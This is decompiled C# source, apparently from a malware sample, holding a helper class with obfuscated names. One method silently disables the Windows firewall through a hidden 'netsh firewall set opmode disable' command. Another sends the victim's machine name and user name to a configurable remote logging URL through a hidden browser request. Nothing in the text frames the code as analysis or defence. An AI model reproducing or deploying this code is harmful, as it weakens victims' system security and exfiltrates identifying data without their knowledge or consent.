using System;
using System.Diagnostics;
using System.Net;
using System.Windows.Forms;

namespace ns0;

public class Common
{
	private static bool bool_0 = false;

	public static bool penetratedFirewall
	{
		get
		{
			if (bool_0)
			{
				return true;
			}
			if (PenetrateFirewall())
			{
				bool_0 = true;
				return true;
			}
			return false;
		}
	}

	public static void Log(string message)
	{
		//IL_0052: Unknown result type (might be due to invalid IL or missing references)
		//IL_0058: Expected O, but got Unknown
		//IL_0067: Unknown result type (might be due to invalid IL or missing references)
		//IL_006d: Invalid comparison between Unknown and I4
		if (string.IsNullOrEmpty(Settables.LOGURL))
		{
			return;
		}
		string text = Environment.MachineName + "-" + Environment.UserName + " : " + message;
		string text2 = Settables.LOGURL + text;
		if (!penetratedFirewall)
		{
			return;
		}
		WebBrowser val = new WebBrowser();
		try
		{
			val.Navigate(text2);
			while ((int)val.get_ReadyState() != 4)
			{
				Application.DoEvents();
			}
		}
		finally
		{
			((IDisposable)val)?.Dispose();
		}
	}

	public static bool PenetrateFirewall()
	{
		using WebClient webClient = new WebClient();
		try
		{
			webClient.DownloadString("http://www.websitetest.com/");
			return true;
		}
		catch
		{
			try
			{
				Process process = new Process();
				ProcessStartInfo processStartInfo = new ProcessStartInfo();
				processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
				processStartInfo.FileName = "cmd.exe";
				processStartInfo.Arguments = "netsh firewall set opmode disable";
				process.StartInfo = processStartInfo;
				process.Start();
				process.WaitForExit();
				return true;
			}
			catch
			{
				return false;
			}
		}
	}
}
